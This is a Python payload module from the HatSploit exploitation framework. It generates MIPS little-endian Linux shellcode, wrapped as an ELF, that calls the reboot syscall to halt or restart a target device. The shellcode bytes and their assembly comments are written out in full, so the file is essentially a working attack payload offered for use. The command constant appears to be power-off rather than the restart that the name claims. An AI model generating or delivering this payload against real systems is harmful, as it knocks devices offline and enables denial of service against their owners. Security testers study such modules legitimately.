#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatvenom import HatVenom
from core.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux mipsle Reboot",
        'Payload': "linux/mipsle/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Reboot payload for Linux mipsle.",
        'Comments': [
            ''
        ],
        'Architecture': "mipsle",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x21\x43\x06\x3c"  # lui     a2,0x4321
            b"\xdc\xfe\xc6\x34"  # ori     a2,a2,0xfedc
            b"\x12\x28\x05\x3c"  # lui     a1,0x2812
            b"\x69\x19\xa5\x34"  # ori     a1,a1,0x1969
            b"\xe1\xfe\x04\x3c"  # lui     a0,0xfee1
            b"\xad\xde\x84\x34"  # ori     a0,a0,0xdead
            b"\xf8\x0f\x02\x24"  # li      v0,4088
            b"\x0c\x01\x01\x01"  # syscall 0x40404
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'mipsle', shellcode)

        return payload
